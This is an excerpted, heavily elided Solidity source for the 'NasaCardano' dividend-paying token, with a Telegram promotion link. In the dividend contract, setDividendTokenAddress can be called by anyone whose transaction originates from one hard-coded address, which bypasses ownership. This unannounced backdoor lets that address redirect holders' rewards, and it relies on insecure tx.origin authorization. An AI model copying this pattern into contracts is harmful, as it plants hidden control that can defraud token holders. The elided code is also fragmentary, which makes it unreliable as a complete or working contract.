...
Telegaram : https://t.me/NasaCardano
Website : https://t.me/NasaCardano
...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x66bb6BD30892FcA4a9F3f8D25C0934F0Fa348c47, "Only owner can change dividend contract address");
...
contract NasaCardano is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    uint256 private cakeDividendRewardsFee;
    ...
    constructor() ERC20("NasaCardano", "NasaCardano") {
    	cakeDividendTracker = new CakeDividendTracker();


    	marketingWallet = 0xa542BA01BF18453C61029753ee87c195C159FEE7;

    	cakeDividendToken = 0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47; //
    ...
    function tradeStart() external onlyOwner {
        ...
        maxBuyTranscationAmount = 50000000000000000000 * (10**18);
        maxSellTransactionAmount = 5000000000000000000 * (10**18);
        maxWalletToken = 50000000000000000000 * (10**18);
    }
    ...
    function setBuyBackAndLiquifyEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = buyBackAndLiquidityFee.add(marketingFee).add(cakeDividendRewardsFee);
            buyBackAndLiquifyEnabled = _enabled;
        }
    ...
    function setCakeDividendEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = cakeDividendRewardsFee.add(marketingFee).add(buyBackAndLiquidityFee);
            cakeDividendEnabled = _enabled;
        }
    ...
    function setMarketingEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = marketingFee.add(cakeDividendRewardsFee).add(buyBackAndLiquidityFee);
            marketingEnabled = _enabled;
        }
    ...
    function updateCakeDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(cakeDividendTracker), "NasaCardano: The dividend tracker already has that address");

        CakeDividendTracker newCakeDividendTracker = CakeDividendTracker(payable(newAddress));

        require(newCakeDividendTracker.owner() == address(this), "NasaCardano: The new dividend tracker must be owned by the NasaCardano token contract");
    ...
    function updateBuyBackAndLiquidityFee(uint8 newFee) external onlyOwner {
        ...
        totalFees = buyBackAndLiquidityFee.add(cakeDividendRewardsFee).add(marketingFee);
    }
        ...
        if (
            ...
            if (!swapping && canSwap) {
                ...
                if (cakeDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(cakeDividendRewardsFee).mul(cakeDividendRewardsFee);
...
contract CakeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("NasaCardano_Dividend_Tracker", "NasaCardano_Dividend_Tracker", 0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47) {
    	claimWait = 1200;
        minimumTokenBalanceForDividends = 50000 * (10**18); //must hold 50,000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "NasaCardano_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "NasaCardano_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EtherBack contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1200 && newClaimWait <= 86400, "NasaCardano_Dividend_Tracker: claimWait" );
        require(newClaimWait != claimWait, "NasaCardano_Dividend_Tracker: Cannot update claimWait to same value");
